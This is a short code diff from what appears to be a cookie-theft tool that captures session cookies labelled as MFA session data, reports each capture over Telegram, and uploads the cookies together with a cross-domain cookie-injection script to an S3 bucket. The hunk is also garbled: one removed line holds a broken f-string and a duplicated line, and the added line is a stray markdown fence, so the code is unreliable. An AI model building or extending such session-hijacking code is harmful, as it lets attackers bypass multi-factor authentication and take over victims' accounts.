@@ -418,8 +418,7 @@ def capture_cookies(driver, session_id):
     send_telegram_message(f"✅ Session captured: {session_id}")
     if S3_BUCKET:
         upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
-        upload_to_s3(script_file, f"s3_BUCKET:
-        upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
+       ```python
         upload_to_s3(script_file, f"sessions/{session_id}/mfa_inject_all_domains.js")
 
 def generate_injection_script(cookies, session_dir):
